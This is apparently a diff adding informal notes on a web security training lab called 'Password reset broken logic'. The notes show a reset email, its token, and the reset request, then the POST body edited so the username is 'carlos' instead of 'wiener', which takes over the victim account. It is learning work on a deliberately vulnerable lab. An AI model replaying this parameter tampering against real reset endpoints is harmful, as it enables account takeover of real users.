@@ -1,0 +1,36 @@
+Lab: Password reset broken logic
+
+ This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.
+
+    Your credentials: wiener:peter
+    Victim's username: carlos
+
+Your email is: wiener@exploit-0a3e001404348f8c81ce6f7201ca002e.exploit-server.net
+
+reset
+
+Sent	To	From	Subject	Body	
+2025-09-07 10:28:21 +0000	wiener@exploit-0a3e001404348f8c81ce6f7201ca002e.exploit-server.net	no-reply@0af5002a048c8f9e818c7072005e00a4.web-security-academy.net	Account recovery	
+
+Hello!
+
+Please follow the link below to reset your password.
+
+https://0af5002a048c8f9e818c7072005e00a4.web-security-academy.net/forgot-password?temp-forgot-password-token=i4jgvzesmz6q9hktmcd201qlv8q4rk3x
+
+Thanks,
+Support team
+
+	View raw
+
+we have in the get GET /forgot-password?temp-forgot-password-token=i4jgvzesmz6q9hktmcd201qlv8q4rk3x HTTP/2
+
+i4jgvzesmz6q9hktmcd201qlv8q4rk3x
+
+i4jgvzesmz6q9hktmcd201qlv8q4rk3x	Unknown	Unrecognized hash format.
+
+temp-forgot-password-token=i4jgvzesmz6q9hktmcd201qlv8q4rk3x&username=wiener&new-password-1=peter&new-password-2=peter
+
+i tried change to carlos instead of wiener and it works :D
+
+temp-forgot-password-token=i4jgvzesmz6q9hktmcd201qlv8q4rk3x&username=carlos&new-password-1=peter&new-password-2=peter
